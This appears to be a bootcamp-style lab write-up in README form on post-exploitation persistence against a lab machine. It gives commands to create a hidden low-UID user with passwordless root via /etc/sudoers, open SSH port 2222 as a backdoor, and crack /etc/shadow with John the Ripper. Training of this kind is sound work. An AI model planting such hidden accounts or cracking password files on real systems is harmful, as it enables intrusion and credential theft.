# Advanced-bash-Owning-the-system
<h3>Step 1: Shadow People</h3>
Create a secret user named sysd. Make sure this user doesn't have a home folder created.

 &emsp;&emsp;**$sudo adduser sysd**

Give your secret user a password. 

 &emsp;&emsp;**$sudo passwd sysd**

Give your secret user a system UID < 1000.

 &emsp;&emsp;**$sudo usermod -u 333 sysd**

Give your secret user the same GID.

 &emsp;&emsp;**$sudo groupmod -g 333 sysd**

Give your secret user full sudo access without the need for a password.  

 &emsp;&emsp;$sudo usermod -aG sudo sysd  
 &emsp;&emsp;$sudo nano /etc/sudoers  
 &emsp;&emsp;$sysd ALL=(ALL:ALL) NOPASSWD:ALL  

 Test that sudo access works without your password.

 &emsp;&emsp;**$sudo ls  
 &emsp;&emsp;Command output is:  
 &emsp;&emsp;Matching Defaults entries for sysd on scavenger-hunt:  
     &emsp;&emsp; &emsp;&emsp;env_reset, exempt_group=sudo, mail_badpass,  
     &emsp;&emsp; &emsp;&emsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin**  

User sysd may run the following commands on scavenger-hunt:
     &emsp;&emsp;**(ALL : ALL) NOPASSWD: ALL**



<h3>Step 2: Smooth Sailing</h3>

 Edit the sshd_config file.  

 &emsp;&emsp;**$sudo nano /etc/ssh/sshd_config  

 &emsp;&emsp;Port 22  
 &emsp;&emsp;Port 2222**  


<h3>Step 3: Testing Your Configuration Update</h3>

 Restart the SSH service.

 &emsp;&emsp;**$systemctl restart ssh**


Exit the root account.

 &emsp;&emsp;**$exit**

SSH to the target machine using your sysd account and port 2222.

 &emsp;&emsp;**$ssh sysd@192.168.6.105 -p 2222**

Use sudo to switch to the root user.

 &emsp;&emsp;**$sudo su**



<h3>Step 4: Crack All the Passwords</h3>

SSH back to the system using your sysd account and port 2222.

 &emsp;&emsp;**$ssh sysd@192.168.6.105 -p 2222**

Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file.

 &emsp;&emsp;**$sudo su  
 &emsp;&emsp;$john /etc/shadow**  

